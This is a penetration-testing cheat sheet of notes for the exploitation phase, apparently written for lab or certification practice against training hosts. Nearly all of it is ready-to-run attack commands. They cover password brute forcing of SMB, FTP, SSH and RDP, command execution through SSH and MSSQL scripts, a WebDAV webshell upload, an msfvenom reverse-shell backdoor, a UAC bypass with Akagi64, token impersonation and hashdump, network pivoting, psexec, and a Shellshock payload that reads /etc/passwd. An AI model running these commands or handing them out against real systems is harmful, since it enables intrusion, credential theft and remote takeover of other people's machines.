# Phase Two - Exploitation

### Wordlists \ Shells
- /usr/share/metasploit-framework/data/wordlists/
- /usr/share/wordlists/rockyou.txt
- /usr/share/webshells


## SMB

gzip -d rockyou.txt.gz\
tar -xvf \
``` msfconsole>smb_login``` (set PASSFILE,SMBUser, RHOST)\
``` hydra -l admin -P /usr/share/wordlists/rockyou.txt IP_ADDRESS smb```\
GetShell ``` msfconsole>psexec```

## FTP \ VSFTP
Check anon login\
```nmap IP_ADDRESS --script ftp-brute --script-args userdb=/root/users -p 21```
- (Linux) exploit/vsftp234 backdoor

## SSH
```nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=student,ssh-run.password=" 192.201.39.3 ```(ssh run command)

```nmap IP_ADDRESS --script ssh-brute --script-args userdb=/root/usersfile -p 22```

``` msfconsole>ssh_login ``` (if targeting root use root_userpass.txt)
## MYSQL
- default sa user account.

``` msfconsole>mysql_login```
``` nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" 10.0.30.33``` 
- auth command  ``` mysql -u root -p -h 10.0.25.212```

## WebDav
``` cadaver hxxp://IP_ADDRESS/webdav``` and ``` #put WEBSHELL_FILE```

RCE, check current user. ``` http://10.0.16.177/webdav/webshell.asp?cmd=whoami``` or ``` type "C:\flag.txt```

## RDP - port 3389
``` hydra -s PORT```

``` xfreerdp /u: /p: /v:``` (user, pass, ip_port)

## WinRM
``` msfconsole>winrm_login, winrm_cmd, winrm_script_exec (auto-reverse-shell, force_vbs TRUE)```

## ByPass UAC
being admin but being limited by filtered token.
- hashdump
- migrate 
- net localgroup administrators
- getuid
- sysinfo

generate payload ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST LPORT -f exe > 'backdoor.exe' ```

copy UACME\Akagi64.exe to target.
Create Handler. Akagi64 use hijack method 23.
``` Akagi64.exe 23 backdoor.exe```

mirgate process. hashdump

## Token impersonation admin
When you need to access a resource as admin.
- getprivs

``` >load incognito, >list_tokens -u, >impersonate_token ATTACKDEFENSE\\Administrator```


## HTTP - HFS rejetto 
searchsploit hfs\
``` msfconsole>search hfs```


## Pivoting 
``` ip addr``` make notes on addresses on eth0 and eth1.
- Add route to metasploit routing table in meterpreter session.
``` >run autoroute -s ADDRESS_ETH1```
- Can run metasploit port scan against new network address.
- To perform local attack box tasks, we need to port forward.
- ``` >portfwd add -l 1234 -p 90 -r REMOTE_SYSTEM_IP```
- Local tool scanning ``` #nmap -sV -p 1234 localhost```

## MYSQL
- ``` mysql_login, mysql_hashdump, mysql_schema_dump```

## SAMBA
- exploit/is_known_pipe

## SMB - Psexec
- With SMB creds, we can use PSEXEC to auth to system with meterpreter session.
PSEXEC is a lightweight telnet replacement. PsExec authentication is performed via SMB. We can use the psecec utility to run remote commands and remote command prompt.
- ``` cp /usr/share/doc/python3-impacket/examples/psexec.py /root/Desktop```
- ``` python3 psexec.py Administrator@10.0.31.252```


## ShellShock - CGI
- Website in source is using dynmaic content through CGI script. Check if vuln with ShellShock.  ``` nmap --script http-shellshock --script-args “http-shellshock.uri=/gettime.cgi” 192.242.220.3```
- Use FoxyProxy and Burp to intercept, modify and send payload in User-Agent string.
``` Payload: ​() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'```

